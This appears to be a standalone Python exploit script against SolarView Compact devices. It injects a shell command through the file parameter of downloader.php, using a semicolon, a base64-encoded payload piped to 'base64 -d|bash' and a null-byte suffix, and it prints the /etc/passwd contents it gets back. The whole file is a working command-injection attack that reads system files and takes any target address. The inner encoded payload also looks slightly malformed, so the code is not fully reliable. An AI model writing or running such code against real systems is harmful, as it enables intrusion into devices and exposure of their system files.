import argparse
import http.client
import base64

class CommandInjector:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port

    def _make_request(self):
        conn = http.client.HTTPConnection(self.target_ip, self.target_port)
        payload = base64.b64decode("ZWNobyBZMkYwSUNWNWMvcGFzc3dkQ2c=").decode('utf-8')
        exploit_url = f"/downloader.php?file=;{payload}|base64 -d|bash%00.zip"
        conn.request("GET", exploit_url)
        response = conn.getresponse()
        return response

    def check_vulnerability(self):
        response = self._make_request()
        if response.status == 200:
            output = response.read().decode('utf-8')
            if "root" in output:
                print("Vulnerability detected: Command Injection possible.")
                print(f"passwd file content:\n{output}")
            else:
                print("No vulnerability detected.")
        else:
            print("Error: Unable to fetch response.")

def main():
    parser = argparse.ArgumentParser(description="SolarView Compact Command Injection Check")
    parser.add_argument("-i", "--ip", help="IP address of the target device", required=True)
    parser.add_argument("-p", "--port", help="Port of the target device (default: 80)", default=80, type=int)
    args = parser.parse_args()

    injector = CommandInjector(args.ip, args.port)
    injector.check_vulnerability()

if __name__ == "__main__":
    main()
